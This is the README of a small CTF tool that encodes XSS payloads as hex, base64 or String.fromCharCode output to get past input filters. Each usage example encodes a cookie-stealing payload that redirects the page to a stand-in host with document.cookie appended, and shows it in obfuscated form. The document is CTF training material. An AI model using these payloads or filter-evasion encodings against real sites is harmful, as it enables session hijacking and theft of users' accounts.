<div align="center">
  <img height="550px" src="https://user-images.githubusercontent.com/28403617/220600629-9da7b084-4fbc-4212-b10e-d395a178a7f5.svg#gh-light-mode-only">
  <img height="550px" src="https://user-images.githubusercontent.com/28403617/220600634-a43af6ba-fc67-4c47-981b-0c4e9c4aba7b.svg#gh-dark-mode-only">
</div>

## What is this?

It's a simple tool to encode payloads for ctf web challenges.

The main interest of this tool is to encode payloads for XSS vulnerabilities on ctfs challenges. It allows generating payloads with `String.fromCharCode` javascript function, raw hexa values and base64, used to bypass some filters.

## How to use it?

```bash
$ python3 enc-ow-der.py -h
usage: enc-ow-der.py [-h] -i INPUT [-b64] [-fchar] [-v]

optional arguments:
  -h, --help            show this help message and exit
  -i INPUT, --input INPUT
                        input string
  -b64, --base-64       encode as base64
  -fchar, --from-char-code
                        output the result with fromCharCode function
  -v, --verbose         verbose
```

## Examples

#### Hexa encoding

```sh-session
python3 enc-ow-der.py -i "document.location.replace('http://example.com/'+btoa(document.cookie))"
```
```bash
\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x6c\x6f\x63\x61\x74\x69\x6f\x6e\x2e\x72\x65\x70\x6c\x61\x63\x65\x28\x27\x68\x74\x74\x70\x3a\x2f\x2f\x65\x78\x61\x6d\x70\x6c\x65\x2e\x63\x6f\x6d\x2f\x27\x2b\x62\x74\x6f\x61\x28\x64\x6f\x63\x75\x6d\x65\x6e\x74\x2e\x63\x6f\x6f\x6b\x69\x65\x29\x29
```

#### Base64 encoding

```sh-session
python3 enc-ow-der.py -i "document.location.replace('http://example.com/'+btoa(document.cookie))" -b64
```
```
ZG9jdW1lbnQubG9jYXRpb24ucmVwbGFjZSgnaHR0cDovL2V4YW1wbGUuY29tLycrYnRvYShkb2N1bWVudC5jb29raWUpKQ==
```

#### String.fromCharCode output
```sh-session
python3 enc-ow-der.py -i "document.location.replace('http://example.com/'+ btoa(document.cookie))" -fchar
```
```
String.fromCharCode(100,111,99,117,109,101,110,116,46,108,111,99,97,116,105,111,110,46,114,101,112,108,97,99,101,40,39,104,116,116,112,58,47,47,101,120,97,109,112,108,101,46,99,111,109,47,39,43,32,98,116,111,97,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41,41)
```

#### Base64 encoding + `String.fromCharCode` output

```sh-session
python3 enc-ow-der.py -i "document.location.replace('http://example.com/'+ btoa(document.cookie))" -fchar -b64
```
```
String.fromCharCode(90,71,57,106,100,87,49,108,98,110,81,117,98,71,57,106,89,88,82,112,98,50,52,117,99,109,86,119,98,71,70,106,90,83,103,110,97,72,82,48,99,68,111,118,76,50,86,52,89,87,49,119,98,71,85,117,89,50,57,116,76,121,99,114,73,71,74,48,98,50,69,111,90,71,57,106,100,87,49,108,98,110,81,117,89,50,57,118,97,50,108,108,75,83,107,61)
```